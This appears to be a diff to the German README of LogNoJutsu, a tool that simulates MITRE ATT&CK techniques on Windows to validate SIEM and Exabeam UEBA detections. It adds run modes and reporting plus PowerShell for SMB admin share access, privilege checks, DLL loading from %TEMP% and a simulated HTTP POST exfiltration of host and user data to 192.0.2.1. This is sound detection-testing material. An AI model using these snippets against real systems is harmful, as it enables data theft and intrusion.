@@ -107,7 +107,7 @@ Die Web-UI besteht aus sieben Bereichen:
 | **Dashboard** | Aktueller Simulationsstatus, Phasen-Anzeige, Ausführungs-Timeline, erwartete SIEM-Events |
 | **Preparation** | Einmalige Systemvorbereitung: Audit Policy, PowerShell-Logging, Sysmon-Installation |
 | **Playbooks** | Übersicht aller verfügbaren Kampagnen und Einzeltechniken |
-| **Configure & Run** | Kampagne auswählen, Zeitverzögerungen konfigurieren, Benutzer-Rotation, Simulation starten/stoppen |
+| **Configure & Run** | Modus wählen (Quick / PoC), Kampagne, Timing, Taktik-Filter, WhatIf-Modus, Benutzer-Rotation, Simulation starten/stoppen |
 | **Results** | Detaillierte Ergebnisse jeder ausgeführten Technik mit Output, Cleanup-Status und ausführendem Benutzer |
 | **Simulation Log** | Live-Log-Stream aller Aktionen mit farbkodierter Ansicht nach Ereignistyp |
 | **Users** | Benutzerprofile verwalten (local/AD), Credentials hinterlegen, Discovery, Credential-Test |
@@ -173,13 +173,29 @@ Sysmon (System Monitor) von Sysinternals wird automatisch heruntergeladen und mi
 
 ## Simulationsphasen
 
+### Simulations-Modi
+
+LogNoJutsu bietet zwei Betriebsmodi:
+
+**Quick Mode** — Einmalige Simulation innerhalb von Minuten/Stunden:
+- T1: Wartezeit vor Phase 1 (0 – 7200s)
+- T2: Pause zwischen Phase 1 und Phase 2 (0 – 7200s)
+- Ideal für schnelle SIEM-Tests und technische Validierung
+
+**PoC Multi-Day Mode** — Mehrtägige Simulation für 4-Wochen-PoC mit Exabeam UEBA:
+- Phase 1 läuft N Tage (z.B. 7–14), täglich 2–5 Discovery-Techniken zur UEBA-Baseline-Bildung
+- Anschließend Pause (Gap, konfigurierbar in Tagen)
+- Phase 2 läuft N Tage (z.B. 7–14), täglich eine vollständige Angriffskampagne
+- Ausführung erfolgt täglich zur konfigurierten Uhrzeit (z.B. 09:00)
+- Dashboard zeigt Countdown bis zur nächsten Ausführung
+
 ### Phase 1 — Discovery ("Low & Slow")
 
-Startet nach der konfigurierten Wartezeit T1 (Standard: 5 Sekunden im Test, in Produktion z.B. 10–30 Minuten). Führt alle 10 Enumeration-Techniken aus. Das Ziel ist es, die UEBA-Baseline zu stören und Recon-Verhalten zu erzeugen, das Anomalie-Detektionen im SIEM triggert.
+Startet nach der konfigurierten Wartezeit T1 (Standard: 5 Sekunden im Test, in Produktion z.B. 10–30 Minuten). Führt alle **10 Enumeration-Techniken** aus (gefiltert nach aktivem Taktik-Filter). Ziel: UEBA-Baseline stören und Recon-Verhalten für Anomalie-Detektionen erzeugen.
 
 ### Phase 2 — Attack ("Full Attack")
 
-Startet nach Abschluss von Phase 1 + Wartezeit T2 (Standard: 30 Sekunden im Test). Führt die ausgewählte Kampagne oder alle 26 Attack-Techniken aus. Hier entstehen die schwerwiegenden Artefakte (Persistence, Credential Access, Defense Evasion).
+Startet nach Abschluss von Phase 1 + Wartezeit T2 (Standard: 30 Sekunden im Test). Führt die ausgewählte Kampagne oder alle **33 Attack-Techniken** aus (gefiltert nach aktivem Taktik-Filter). Hier entstehen die schwerwiegenden Artefakte (Persistence, Credential Access, Defense Evasion, Exfiltration).
 
 ### Cleanup
 
@@ -262,6 +278,41 @@ $proc = [System.Diagnostics.Process]::Start($psi)
 
 ---
 
+## Ausführungsoptionen
+
+### WhatIf-Modus (Vorschau)
+
+Der **WhatIf-Modus** führt keine Techniken aus, sondern zeigt nur was ausgeführt würde. Ideal für:
+- Planung vor einer Simulation
+- Demos ohne Artefakte
+- Überprüfung des Taktik-Filters
+
+Aktivierung: Checkbox „WhatIf-Modus" in Configure & Run. Der Simulations-Log zeigt `[WhatIf] Would run: T1082 — ...` für jede Technik. Am Ende werden JSON- und HTML-Report generiert (mit WhatIf-Badge markiert).
+
+### Pause zwischen Techniken
+
+Konfigurierbare Wartezeit (Sekunden) nach jeder ausgeführten Technik. Sinnvoll für:
+- Realistisches operationelles Tempo (Attacker-Pacing)
+- SIEM-Korrelationsfenster einhalten
+- Vermeidung zu dichter Event-Bursts
+
+Empfehlung: 5–30 Sekunden für reale PoC-Simulationen.
+
+### Taktik-Filter
+
+Checkboxen für alle 10 ATT&CK-Taktiken ermöglichen gezieltes Ein-/Ausschließen:
+
+| Anwendungsfall | Filter-Konfiguration |
+|---|---|
+| Nur Discovery-Events | Alle abwählen, nur `discovery` aktiv |
+| Keine destruktiven Techniken | `impact` abwählen |
+| Nur Credential-Tests | `credential-access` + `privilege-escalation` aktiv |
+| Exfiltrations-Validierung | `exfiltration` + `collection` aktiv |
+
+Der Filter wirkt in beiden Modi (Quick + PoC Multi-Day).
+
+---
+
 ## Exabeam Use Case Abdeckung
 
 LogNoJutsu deckt alle drei Exabeam TDIR Use Case Packages mit insgesamt 21 Use Cases ab. Die folgende Tabelle zeigt die Zuordnung:
@@ -318,6 +369,8 @@ LogNoJutsu deckt alle drei Exabeam TDIR Use Case Packages mit insgesamt 21 Use C
 ---
 
 ## Techniken — Vollständige Referenz
+
+> **NIST 800-53:** Jede Technik enthält im YAML-Playbook zugeordnete NIST 800-53 Controls (z.B. `AC-3, AU-12, SI-4`). Diese werden in der Web-UI im Tab "Playbooks" in der Spalte **NIST** angezeigt und ermöglichen die Zuordnung der Simulationsergebnisse zu Compliance-Anforderungen.
 
 ### Phase 1: Discovery (Enumeration)
 
@@ -1700,6 +1753,153 @@ Clear-EventLog -LogName "System"
 
 ---
 
+#### T1021.002 — SMB Admin Shares (Lateral Movement)
+
+| Eigenschaft | Wert |
+|---|---|
+| MITRE ATT&CK | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) |
+| Taktik | Lateral Movement |
+| NIST 800-53 | AC-3, AC-17, SI-4 |
+| Admin erforderlich | Nein |
+| Cleanup | Keiner |
+
+**Was wird ausgeführt:**
+
+```powershell
+# Lokale SMB-Freigaben auflisten
+net share
+
+# WMI Win32_Share Enumeration (EID 4104, 4688)
+Get-WmiObject -Class Win32_Share | Select-Object Name, Path, Type
+
+# Admin-Share-Zugriff testen — erzeugt EID 5140/5145
+foreach ($share in @("C$", "IPC$", "ADMIN$")) {
+    Test-Path "\\$env:COMPUTERNAME\$share" | Out-Null
+}
+```
+
+**Warum das Angreifer tun:** SMB Admin Shares (`C$`, `ADMIN$`) sind Standardzugriffswege für laterale Bewegung in Windows-Umgebungen. Angreifer nutzen sie für Remote-Datei-Zugriff und -Ausführung. Zugriff auf `C$` ohne aktive Netzlaufwerkverbindung ist ein starkes Anomalie-Signal in UEBA-Systemen.
+
+**Erwartete SIEM-Events:**
+- `4688` — `net.exe` mit `share`
+- `5140` — Network Share Object Access (Admin-Share-Zugriff)
+- `5145` — Network Share Object Check (detaillierter Zugriffs-Check)
+- `Sysmon 3` — SMB-Verbindung (Port 445)
+
+---
+
+#### T1041 — Exfiltration Over C2 Channel (HTTP POST Simulation)
+
+| Eigenschaft | Wert |
+|---|---|
+| MITRE ATT&CK | [T1041](https://attack.mitre.org/techniques/T1041/) |
+| Taktik | Exfiltration |
+| NIST 800-53 | SC-7, SI-4, AU-12 |
+| Admin erforderlich | Nein |
+| Cleanup | Keiner |
+
+**Was wird ausgeführt:**
+
+```powershell
+# Simulierter HTTP POST mit Base64-codiertem Payload an nicht-existenten Host
+$payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("simulated-exfil-data"))
+$body = @{ data = $payload; host = $env:COMPUTERNAME; user = $env:USERNAME } | ConvertTo-Json
+
+try {
+    Invoke-WebRequest -Uri "http://192.0.2.1/exfil" -Method POST -Body $body `
+        -ContentType "application/json" -TimeoutSec 3 -ErrorAction Stop
+} catch {
+    # Verbindungsfehler erwartet — Sysmon EID 3 (Netzwerkverbindung) trotzdem erzeugt
+    Write-Host "[Simulation] Exfiltration attempt logged (connection failed as expected)"
+}
+```
+
+**Warum das Angreifer tun:** HTTP POST an externe Adressen ist der häufigste Exfiltrations-Kanal. Der Verbindungsversuch erzeugt Sysmon EID 3 (NetworkConnect) unabhängig vom Verbindungsergebnis — genau das Signal, auf das SIEM-Korrelationsregeln prüfen. Base64-Encoding des Payloads ist das Standardmuster für Data Staging vor Exfiltration.
+
+**Erwartete SIEM-Events:**
+- `Sysmon 3` — NetworkConnect-Event: `powershell.exe` → Port 80 an externe IP
+- `4688` — `powershell.exe` Prozesserstellung
+- `4104` — ScriptBlock: `Invoke-WebRequest` mit externem Ziel
+- `Sysmon 22` — DNS-Abfrage (falls Hostname statt IP verwendet)
+
+---
+
+#### T1134.001 — Token Impersonation / Privilege Check
+
+| Eigenschaft | Wert |
+|---|---|
+| MITRE ATT&CK | [T1134.001](https://attack.mitre.org/techniques/T1134/001/) |
+| Taktik | Privilege Escalation |
+| NIST 800-53 | AC-6, AU-9, SI-4 |
+| Admin erforderlich | Nein (Discovery), Ja (volle Ausnutzung) |
+| Cleanup | Keiner |
+
+**Was wird ausgeführt:**
+
+```powershell
+# Aktueller Benutzerkontext und Privileges
+whoami /priv
+
+# SeDebugPrivilege-Prüfung — Schlüsselprivilege für Token-Manipulation
+$privs = whoami /priv /fo csv | ConvertFrom-Csv
+$debug = $privs | Where-Object { $_.Privilege -match "SeDebugPrivilege" }
+Write-Host "SeDebugPrivilege: $($debug.State)"
+
+# .NET WindowsIdentity Token-Abfrage
+$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+Write-Host "Token: $($identity.Name) | ImpersonationLevel: $($identity.ImpersonationLevel)"
+Write-Host "IsSystem: $($identity.IsSystem) | IsAdmin: $([System.Security.Principal.WindowsPrincipal]::new($identity).IsInRole('Administrators'))"
+```
+
+**Warum das Angreifer tun:** Token Impersonation ist ein zentraler Privilege-Escalation-Pfad. `SeDebugPrivilege` ermöglicht den Zugriff auf LSASS (Credential Dumping) und andere privilegierte Prozesse. Die `.NET WindowsIdentity`-Abfrage erzeugt EID 4673 (Sensitive Privilege Use) und ist ein Exabeam-First-Time-Seen-Signal.
+
+**Erwartete SIEM-Events:**
+- `4673` — Sensitive Privilege Use (SeDebugPrivilege-Check)
+- `4672` — Special Logon (falls mit privilegiertem Konto ausgeführt)
+- `4688` — `whoami.exe` mit `/priv`
+- `4104` — ScriptBlock: `.NET WindowsIdentity`-Abfragen
+
+---
+
+#### T1574.002 — DLL Side-Loading Simulation
+
+| Eigenschaft | Wert |
+|---|---|
+| MITRE ATT&CK | [T1574.002](https://attack.mitre.org/techniques/T1574/002/) |
+| Taktik | Defense Evasion / Persistence |
+| NIST 800-53 | SI-7, CM-7, AU-12 |
+| Admin erforderlich | Nein |
+| Cleanup | Temporäre DLL in `%TEMP%` |
+
+**Was wird ausgeführt:**
+
+```powershell
+# Benigne DLL per Add-Type kompilieren (keine echte Malware)
+$tempDll = "$env:TEMP\LNJ_SideLoad_$(Get-Random).dll"
+Add-Type -TypeDefinition @"
+    public class SimDll {
+        public static string GetInfo() { return "LogNoJutsu DLL Side-Load Simulation"; }
+    }
+"@ -OutputAssembly $tempDll
+
+# DLL von nicht-standardem Pfad laden (erzeugt Sysmon EID 7)
+$asm = [System.Reflection.Assembly]::LoadFrom($tempDll)
+$result = $asm.GetType("SimDll").GetMethod("GetInfo").Invoke($null, $null)
+Write-Host "Loaded DLL result: $result"
+
+# Cleanup
+Remove-Item $tempDll -ErrorAction Ignore
+```
+
+**Warum das Angreifer tun:** DLL Side-Loading lädt bösartige DLLs über legitime Anwendungen, die DLLs aus relativ angegebenen Pfaden laden. Das Laden einer DLL aus `%TEMP%` ist ein starkes Anomalie-Signal — legitime Anwendungen laden DLLs aus `System32` oder ihrem Installationsverzeichnis. Sysmon EID 7 (ImageLoaded) mit einem Temp-Pfad ist ein Tier-1-Alert in vielen SIEM-Regelwerken.
+
+**Erwartete SIEM-Events:**
+- `Sysmon 7` — ImageLoaded: DLL aus `%TEMP%`-Pfad geladen
+- `4688` — `powershell.exe` Prozesserstellung
+- `4104` — ScriptBlock: `Assembly::LoadFrom` mit nicht-standardem Pfad
+
+---
+
 ### UEBA-Szenarien (Exabeam)
 
 Diese Szenarien sind speziell für die Validierung von **Exabeam UEBA-Use-Cases** konzipiert. UEBA (User and Entity Behavior Analytics) erkennt keine einzelnen Events, sondern **Verhaltensmuster über Zeit**. Exabeam nutzt 750+ vortrainierte Verhaltensmodelle (Kategorial, Numerisch-Clustered, Zeitbasiert), die pro Benutzer, Peer-Group und Organisation kalibriert werden.
@@ -1982,6 +2182,22 @@ Für jede Simulation wird eine Textdatei im Format `lognojutsu_YYYYMMDD_HHMMSS_[
 Zusätzlich wird `lognojutsu_report_YYYYMMDD_HHMMSS.json` erstellt:
 - Gesamtstatistik: Gesamt / Erfolgreich / Fehlgeschlagen
 - Pro Technik: ID, Name, Taktik, Start/Ende, Success, Stdout, Stderr, Cleanup-Status, ausführender Benutzer (`run_as_user`)
+
+### HTML-Report (`.html`)
+
+Nach jeder Simulation wird zusätzlich `lognojutsu_report_YYYYMMDD_HHMMSS.html` generiert — ein vollständiger Simulationsbericht im Dark-Theme-Format:
+
+| Abschnitt | Inhalt |
+|---|---|
+| **Summary-Grid** | 4 Kacheln: Gesamttechniken / Erfolgreich / Fehlgeschlagen / Dauer |
+| **Taktik-Heatmap** | Pro ATT&CK-Taktik: Anzahl Techniken + Erfolgsrate als farbiger Balken |
+| **Ergebnistabelle** | Jede Technik mit ID, Taktik, ausführendem Benutzer, Dauer, Erfolg/Fehler, Output-Excerpt |
+| **WhatIf-Badge** | Sichtbarer Hinweis wenn Simulation im WhatIf-Modus ausgeführt wurde |
+
+**Zugriff:**
+- Datei direkt im Arbeitsverzeichnis öffnen
+- In der Web-UI: Tab "Results" → Button **"HTML Report öffnen"** (erscheint nach Simulation)
+- API: `GET /api/report` — liefert den letzten HTML-Report inline
 
 ---
 
